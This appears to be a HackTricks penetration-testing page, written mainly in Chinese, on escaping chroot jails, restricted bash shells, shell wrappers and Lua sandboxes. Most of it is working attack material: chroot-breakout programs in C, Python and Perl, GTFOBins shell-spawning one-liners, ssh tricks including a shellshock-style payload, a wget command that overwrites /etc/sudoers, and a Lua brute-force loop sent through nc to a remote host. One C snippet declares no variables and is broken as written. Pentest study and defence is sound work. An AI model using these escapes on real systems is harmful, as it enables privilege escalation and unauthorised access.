# 逃离 Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**

## Chroot Escapes

来自 [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)：chroot 机制**并非旨在防御**有**特权**（**root**）**用户**的蓄意篡改。在大多数系统上，chroot 上下文不能正确叠加，而且拥有足够权限的 chroot 程序**可以执行第二次 chroot 来逃逸**。\
通常这意味着，要逃逸你需要在 chroot 内部拥有 root。

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) 是为滥用以下场景并从 `chroot` 中逃逸而创建的。

### Root + CWD

> [!WARNING]
> 如果你在 chroot 内部是 **root**，你**可以通过创建另一个 chroot 来逃逸**。这是因为在 Linux 中两个 chroot 不能共存，所以如果你创建一个文件夹，然后在那个新文件夹上**创建一个新的 chroot**，而你**位于它外部**，那么你现在就会**处于新的 chroot 外部**，因此你会在 FS 中。
>
> 这是因为通常 chroot **不会**把你的工作目录移动到指定位置，所以你可以创建一个 chroot，但实际上位于它外部。

通常你不会在 chroot jail 中找到 `chroot` binary，但你**可以编译、上传并执行**一个 binary：

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> 这与前一种情况类似，但在这种情况下，**attacker 将当前目录的 file descriptor 保存起来**，然后**在一个新文件夹中创建 chroot**。最后，由于他在 chroot **外部** 可以**访问**那个 **FD**，他就访问它并**逃出**。

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD 可以通过 Unix Domain Sockets 传递，所以：
>
> - 创建一个子进程 (fork)
> - 创建 UDS，使 parent 和 child 可以通信
> - 在 child process 中把 chroot 运行到另一个文件夹
> - 在 parent proc 中，创建一个位于新 child proc chroot 之外的文件夹的 FD
> - 通过 UDS 把那个 FD 传给 child procc
> - Child process chdir 到那个 FD，并且因为它在 chroot 外面，它将 escape 这个 jail

### Root + Mount

> [!WARNING]
>
> - 将 root device (/) mount 到 chroot 内部的一个目录
> - chroot 到那个目录
>
> 这在 Linux 中是可行的

### Root + /proc

> [!WARNING]
>
> - 将 procfs mount 到 chroot 内部的一个目录（如果还没有的话）
> - 查找一个具有不同 root/cwd entry 的 pid，例如：/proc/1/root
> - chroot 到那个 entry

### Root(?) + Fork

> [!WARNING]
>
> - 创建一个 Fork (child proc) 并 chroot 到 FS 更深处的另一个文件夹，然后在其上 CD
> - 从 parent process 中，把 child process 所在的文件夹移动到 children 的 chroot 之前的上一级文件夹
> - 这个 children process 会发现自己处于 chroot 外部

### ptrace

> [!WARNING]
>
> - 以前用户可以从它自身的一个 process 中调试自己的 processes... 但默认情况下现在不再可以
> - 无论如何，如果可以，你就可以 ptrace 一个 process，并在其中执行 shellcode ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

获取有关这个 jail 的信息：
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### 修改 PATH

检查你是否可以修改 PATH 环境变量
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### 使用 vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers 和 help viewers

许多受限环境仍然保留可用的 **pagers** 或 **help viewers**。通常滥用它们比尝试重建 `PATH` 更快。
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
如果 `git` 可用，请记住它的帮助输出通常会通过 pager：
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### 常见 GTFOBins one-liners

一旦你知道哪些 binaries 可达，先测试最明显的 shell spawners：
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
如果你只能向一个允许的命令中**注入参数**（而不是自由执行它），也请查看 **GTFOArgs**。

### Create script

检查你是否可以创建一个以 _/bin/bash_ 作为内容的可执行文件
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### 从 SSH 获取 bash

如果你是通过 ssh 访问，通常可以让服务器执行一个**不同的程序**，而不是受限的登录 shell：
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
如果 `ssh` 是少数几个本地允许的二进制文件之一，请记住它也可以被滥用为 **GTFOBin**：
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### 声明
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

你可以覆盖，例如 sudoers 文件
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

某些环境不会把你直接丢进普通的 `rbash`，而是丢进 **wrappers**，例如 `git-shell`、`rssh` 或 `lshell`：

- `git-shell` 只接受 server-side Git commands，以及 `~/git-shell-commands/` 中存在的任何内容。如果该目录存在，运行 `help` 来枚举允许的自定义操作。如果你能在那里 **write**，那么放进去的任何可执行文件都可以被访问。
- `rssh` / `lshell` 通常只允许 `scp`、`sftp`、`rsync` 或 Git-style operations。在这些情况下，先专注于 **file write primitives**：把 `authorized_keys`、shell startup file 或 helper script 上传到一个可写位置，然后用 `ssh -t ...` 重新连接。
- 如果 wrapper 只是过滤 command line，枚举可访问的 binaries，然后再转回 **GTFOBins / GTFOArgs**。

### Other tricks

另外也可以查看：

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**It could also be interesting the page:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

关于从 python jails 中逃逸的技巧见下面页面：


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

在这个页面你可以找到在 lua 中可访问的 global functions: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
一些无需使用点号即可**调用库函数**的小技巧：
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
枚举一个库的函数：
```bash
for k,v in pairs(string) do print(k,v) end
```
注意，每次你在**不同的 lua 环境**中执行前面的 one-liner 时，函数的顺序都会改变。因此，如果你需要执行某个特定函数，可以通过加载不同的 lua 环境并调用 le library 的第一个函数来进行 brute force attack：
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**获取交互式 lua shell**: 如果你处于一个受限的 lua shell 中，你可以通过调用以下命令获取一个新的 lua shell（并且希望是无限制的）：
```bash
debug.debug()
```
## 参考资料

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
